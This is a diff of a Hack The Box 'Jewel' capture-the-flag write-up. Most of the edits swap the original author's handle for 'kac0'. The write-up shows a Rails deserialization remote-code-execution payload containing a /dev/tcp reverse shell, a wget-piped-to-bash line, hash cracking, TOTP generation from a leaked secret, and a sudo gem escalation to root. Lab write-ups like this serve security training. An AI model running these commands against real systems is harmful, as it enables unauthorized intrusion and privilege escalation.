@@ -9,6 +9,7 @@ avatar: assets/htb/jewel.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Jewel
 ---
+
 ## Overview
 
 TODO: finish writeup and clean up
@@ -30,7 +31,7 @@ wget -O - -q $url:$port/$file | bash
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/jewel]
+┌──(kac0㉿kali)-[~/htb/jewel]
 └─$ nmap -sCV -n -p- -Pn -v -oA jewel <YOUR_IP>                                                130 ⨯
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-13 20:56 EST
@@ -103,37 +104,37 @@ My nmap scan found only three open ports: 22 -SSH, 8000 - HTTP, and 8080 - HTTP.
 
 ### Port 8080 - HTTP
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-bl0g.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-bl0g.png)
 
 On the site hosted on port 8080 I found a "Bl0g" site.  While looking through the articles I found two potential usernames `bill` and `jennifer`. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-bibo-profile.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-bibo-profile.png)
 
 created an account, then logged in. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-edit-user.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-edit-user.png)
 
 On the profile page saw a 'edit profile' link and was hoping for a image upload box, but there wasn't anything useful as I could only update the username.
 
 ### Port 8000 - HTTP
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-git-bl0g.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-git-bl0g.png)
 
 On the web server hosted on port 8000 I found a git page for the "Bl0g".
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-git-bl0g-tree.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-git-bl0g-tree.png)
 
 file tree
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-git-code-rails-ver.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-git-code-rails-ver.png)
 
 The file `Gemfile` contained version information for all of the source files for the project, including the version of the Ruby on Rails Framework.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-git-code-hashes.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-git-code-hashes.png)
 
 in the git code I found a couple of password hashes, in the file bd.sql
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-git-code-hashes2.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-git-code-hashes2.png)
 
 I downloaded the git code for the site by clicking on the `snapshot` link.  I opened the SQL database locally but didn't find anything more that seemed useful in it, or in the rest of the code files.
 
@@ -167,7 +168,7 @@ On cvebase there were eight POCs listed for this CVE which looked like a winner!
 The instructions looked simple enough to follow, but I did not have rails installed, so I did that first.  Next, I created a new project called `test`. \(Had to change the name to `testing`, since 'test' is apparently a ruby/rails reserved key word.\)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/jewel]
+┌──(kac0㉿kali)-[~/htb/jewel]
 └─$ rails new testing             
       create  
       create  README.md
@@ -187,7 +188,7 @@ hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
 hint: 'development'. The just-created branch can be renamed via this command:
 hint: 
 hint:   git branch -m <name>
-Initialized empty Git repository in /home/zweilos/htb/jewel/exploit/.git/
+Initialized empty Git repository in /home/kac0/htb/jewel/exploit/.git/
       create  package.json
       create  app
       create  app/assets/config/manifest.js
@@ -305,10 +306,10 @@ Run `bundle install` to install missing gems.
 Could not find gem 'rails (~> 6.0.3, >= 6.0.3.4)' in any of the gem sources listed in your Gemfile.
 Run `bundle install` to install missing gems.
 
-┌──(zweilos㉿kali)-[~/htb/jewel]
+┌──(kac0㉿kali)-[~/htb/jewel]
 └─$ cd testing
 
-┌──(zweilos㉿kali)-[~/htb/jewel/exploit]
+┌──(kac0㉿kali)-[~/htb/jewel/exploit]
 └─$ bundle install                                                                                                                                                                                            7 ⨯
 Fetching gem metadata from https://rubygems.org/............
 Fetching gem metadata from https://rubygems.org/.
@@ -330,26 +331,26 @@ I had a lot of dependency issues, from yarn, webpacker, rails, and more...
 * [https://github.com/rails/webpacker/issues/818](https://github.com/rails/webpacker/issues/818)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/jewel/testing]
+┌──(kac0㉿kali)-[~/htb/jewel/testing]
 └─$ bundle clean                    
 
-┌──(zweilos㉿kali)-[~/htb/jewel/testing]
+┌──(kac0㉿kali)-[~/htb/jewel/testing]
 └─$ which yarn
 /usr/local/bin/yarn
 
-┌──(zweilos㉿kali)-[~/htb/jewel/testing]
+┌──(kac0㉿kali)-[~/htb/jewel/testing]
 └─$ sudo gem uninstall -aIx yarn
 Removing yarn
 Successfully uninstalled yarn-0.1.1
 
-┌──(zweilos㉿kali)-[~/htb/jewel/testing]
+┌──(kac0㉿kali)-[~/htb/jewel/testing]
 └─$ sudo npm install --global yarn
 
 added 1 package, and audited 2 packages in 1s
 
 found 0 vulnerabilities
 
-┌──(zweilos㉿kali)-[~/htb/jewel/testing]
+┌──(kac0㉿kali)-[~/htb/jewel/testing]
 └─$ rails webpacker:install       
       create  config/webpacker.yml
 Copying webpack core config
@@ -358,7 +359,7 @@ Copying webpack core config
 I had to do the above steps to resolve the webpacker issues I was receiving. For some reason the gem version of yarn was causing problems, so I had to remove it and install it through npm. 
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/jewel/testing]
+┌──(kac0㉿kali)-[~/htb/jewel/testing]
 └─$ rails c                
 Loading development environment (Rails 6.0.3.5)
 irb(main):001:0>
@@ -367,7 +368,7 @@ irb(main):001:0>
 After installing all of the dependencies I was able to start the rails console.
 
 ```ruby
-┌──(zweilos㉿kali)-[~/htb/jewel/testing]
+┌──(kac0㉿kali)-[~/htb/jewel/testing]
 └─$ rails c                
 Loading development environment (Rails 6.0.3.5)
 irb(main):001:0> code = '`bash -c "bash -i >& /dev/tcp/10.10.15.13/8099 0>&1"`'
@@ -392,22 +393,22 @@ irb(main):011:0>quit()
 
 After all of that work, it was pretty easy to follow the instructions in the POC to create the payload.  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-burp-payload.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-burp-payload.png)
 
 captured request to change the username on the 'edit profile' page in burp, then added my payload in place of the username field
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-burp-payload-error.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-burp-payload-error.png)
 
 On the exit profile page, got an error message after sending my payload in place of the username field, but  the payload still executed.
 
 ## Initial Foothold
 
 ```text
-zweilos@kali:~/htb/jewel$ script
+kac0@kali:~/htb/jewel$ script
 Script started, output log file is 'typescript'.
-┌──(zweilos㉿kali)-[~/htb/jewel]
+┌──(kac0㉿kali)-[~/htb/jewel]
 └─$ bash      
-zweilos@kali:~/htb/jewel$ nc -lvnp 8099
+kac0@kali:~/htb/jewel$ nc -lvnp 8099
 listening on [any] 8099 ...
 connect to [10.10.15.13] from (UNKNOWN) [<YOUR_IP>] 40016
 bash: cannot set terminal process group (818): Inappropriate ioctl for device
@@ -425,7 +426,7 @@ bill@jewel:~/blog$ python3 -c 'import pty;pty.spawn("/bin/bash")'
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 bill@jewel:~/blog$ ^Z
 [1]+  Stopped                 nc -lvnp 8099
-zweilos@kali:~/htb/jewel$ stty raw -echo
+kac0@kali:~/htb/jewel$ stty raw -echo
 nc -lvnp 8099:~/htb/jewel$ 
 
 bill@jewel:~/blog$ export TERM=xterm-256color
@@ -472,7 +473,7 @@ There was a few interesting hidden files in `bill`'s home folder, including one 
 
 ```text
 bill@jewel:~$ cat user.txt 
-9688****83b2
+9688************************83b2
 ```
 
 I was happy to see that `bill` had the `user.txt` flag in his home directory!
@@ -489,12 +490,12 @@ I was happy to see that `bill` had the `user.txt` flag in his home directory!
 
 linpeas pointed out that there were a couple of files with password hashes. The second one was one that I had tried to crack unsuccessfully before, but the other was new. Since it was in a backups folder, it was possible that this was an old password that was used elsewhere
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-db-backup.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-db-backup.png)
 
 I copied the backup SQL file to my local machine and opened it up. There were a couple of new hashes in it, which I loaded into hashcat to try to crack.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/jewel]
+┌──(kac0㉿kali)-[~/htb/jewel]
 └─$ hashcat -O -D1,2 -a0 -m3200 --username hash_backup  /usr/share/wordlists/rockyou.txt
 hashcat (v6.1.1) starting...
 
@@ -511,7 +512,7 @@ No hashes loaded.
 Started: Sun Feb 14 18:04:00 2021
 Stopped: Sun Feb 14 18:04:00 2021
 
-┌──(zweilos㉿kali)-[~/htb/jewel]
+┌──(kac0㉿kali)-[~/htb/jewel]
 └─$ hash-identifier                                                                              255 ⨯
    #########################################################################
    #     __  __                     __           ______    _____           #
@@ -534,7 +535,7 @@ Stopped: Sun Feb 14 18:04:00 2021
 
         Bye!
 
-┌──(zweilos㉿kali)-[~/htb/jewel]
+┌──(kac0㉿kali)-[~/htb/jewel]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_backup
 Using default input encoding: UTF-8
 Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
@@ -674,7 +675,7 @@ After setting my system to GMT I got a different sort of error. The time between
 * [https://superuser.com/questions/577495/how-can-i-sync-date-time-in-two-computers](https://superuser.com/questions/577495/how-can-i-sync-date-time-in-two-computers)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/jewel]
+┌──(kac0㉿kali)-[~/htb/jewel]
 └─$ remote_time=`ssh -i jewel bill@<YOUR_IP> date` && date -s $remote_time
 date: invalid date ‘Mon 15 Feb 00:51:59 GMT 2021’
 ```
@@ -690,25 +691,25 @@ After playing around with matching the times, I realized that the time zone, and
 > ...you should be using a fully named time zone like America/New\_York or Europe/London or whatever is appropriate for your location...
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/jewel]
+┌──(kac0㉿kali)-[~/htb/jewel]
 └─$ sudo timedatectl set-timezone Europe/London
-[sudo] password for zweilos: 
+[sudo] password for kac0: 
 
-┌──(zweilos㉿kali)-[~/htb/jewel]
+┌──(kac0㉿kali)-[~/htb/jewel]
 └─$ date
 Sun 14 Feb 2021 07:27:42 PM GMT
 
-┌──(zweilos㉿kali)-[~/htb/jewel]
+┌──(kac0㉿kali)-[~/htb/jewel]
 └─$ sudo date -s "02:28:50 AM"                                                                     1 ⨯
 Sun 14 Feb 2021 02:28:50 AM GMT
 
-┌──(zweilos㉿kali)-[~/htb/jewel]
+┌──(kac0㉿kali)-[~/htb/jewel]
 └─$ sudo date -s "Mon 15 Feb" 
 Mon 15 Feb 2021 12:00:00 AM GMT
 
-┌──(zweilos㉿kali)-[~/htb/jewel]
+┌──(kac0㉿kali)-[~/htb/jewel]
 └─$ sudo date -s "02:29:15 AM"
-[sudo] password for zweilos: 
+[sudo] password for kac0: 
 Mon 15 Feb 2021 02:29:15 AM GMT
 ```
 
@@ -751,11 +752,11 @@ bill@jewel:~$ less /etc/sudoers
 I had forgotten to check this file earlier, but I was somewhat relieved that all of the pain that it took to sync the date and time wasn't in vain.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/jewel]
+┌──(kac0㉿kali)-[~/htb/jewel]
 └─$ oathtool --totp -b 2UQI3R52WFCLE6JTLDCSJYMJH4
 509498
 
-┌──(zweilos㉿kali)-[~/htb/jewel]
+┌──(kac0㉿kali)-[~/htb/jewel]
 └─$ oathtool --totp -b 2UQI3R52WFCLE6JTLDCSJYMJH4
 695810
 bill@jewel:~$ sudo gem open -e "/bin/sh -c /bin/sh" rdoc
@@ -782,5 +783,5 @@ drwxr-xr-x 2 root root 4096 Aug 26 09:35 exe
 # ls
 root.txt
 # cat root.txt
-ccd6****0448
+ccd6************************0448
 ```
